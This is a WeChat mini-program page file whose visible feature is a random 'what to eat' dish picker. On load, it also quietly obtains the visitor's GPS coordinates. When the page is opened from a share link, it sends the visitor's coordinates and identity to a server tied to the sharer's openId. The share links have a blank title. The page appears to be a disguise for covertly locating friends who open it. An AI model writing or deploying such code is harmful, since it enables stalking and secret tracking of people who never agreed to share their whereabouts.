//index.js
//获取应用实例
let config = require('../../config');
let user = require('../../utils/user.js')
let util = require('../../utils/util.js')
const app = getApp()

Page({
    data: {
        friendName: '',
        userInfo: {},
        loginInfo: {},
        fromOpenId: '',
        menu: ['西红柿炒蛋', '鱼香茄子', '宫保鸡丁', '青椒肉丝', '牛肉面', '木须肉', '东坡肉', '大盘鸡', '麻婆豆腐', '红烧鱼'],
        myMenu: '',
        hasUserInfo: false,
        canIUse: wx.canIUse('button.open-type.getUserInfo')
    },

    clickWhatBtn: function () {
        let that = this;
        that.setData({myMenu: '...'})
        wx.showLoading({title: '加载中',})
        let random = Math.floor(Math.random() * 10)
        setTimeout(function () {
            wx.hideLoading()
            that.setData({myMenu: that.data.menu[random]})
        }, 900)
    },
    onLoad: function (options) {
        let that = this
        that.setData({fromOpenId: '', friendName: ''})
        let share = options.share
        console.log('options.fromOpenId', options.fromOpenId)
        console.log('options.friendName', options.friendName)
        if (share) {
            that.setData({fromOpenId: options.fromOpenId || '', friendName: options.friendName || ''})
        }
        this.myLocation()
    },
    myLocation: function () {
        let that = this
        wx.getLocation({
            type: 'gcj02',
            success: function (res) {
                let latitude = res.latitude;
                let longitude = res.longitude;
                user.login()
                    .then(r => {
                        console.log('login:', r)
                        app.globalData.loginInfo = r;
                        let nickName = that.data.friendName;
                        let openId = app.globalData.loginInfo.openid;
                        return user.addUser(openId, nickName)
                    })
                    .then((d) => {
                        console.log('addUser:', d)
                        let params = {
                            fromOpenId: that.data.fromOpenId,
                            openId: app.globalData.loginInfo.openid,
                            nickName: that.data.friendName,
                            coordinate: latitude + ',' + longitude
                        }
                        if (!params.fromOpenId || (params.fromOpenId === params.openId)) {
                            return;
                        }
                        return user.location(params)
                    }).then((d) => {
                    console.log('addUserLoca', d)
                })
                    .catch(e => {
                        console.log(e);
                    })
            }
        })
    },

    /**
     * 用户点击右上角分享
     */
    onShareAppMessage: function (res) {
        let that = this
        return {
            title: ' ',
            path: '/pages/index/index?share=2&fromOpenId=' + app.globalData.loginInfo.openid + '&friendName=',
            success: function (res) {
                // 转发成功
                console.log('转发成功')
                console.log(res)
                // 记录openId
                let openId = app.globalData.loginInfo.openid
                console.log(openId)
                if (!openId) {
                    return console.log('openId not found')
                }
                wx.request({
                    url: config.SHARE_URL,
                    method: 'POST',
                    dataType: 'json',
                    data: {openId: openId},
                    success: function (res) {
                        console.log('结果', res);
                        if (res.statusCode === 200 && res.data.code === 200) {
                            wx.showModal({title: '分享成功', content: res.data.msg})
                        } else {
                            wx.showModal({title: '分享失败', content: res.data.msg})
                        }
                    },
                    fail: function () {
                        wx.showModal({title: '提示', content: '请求失败，请重试！'})
                    },
                })
            },
            fail: function (res) {
                // 转发失败
                console.log('转发失败')
                console.log(res)
            }
        }

    }
})
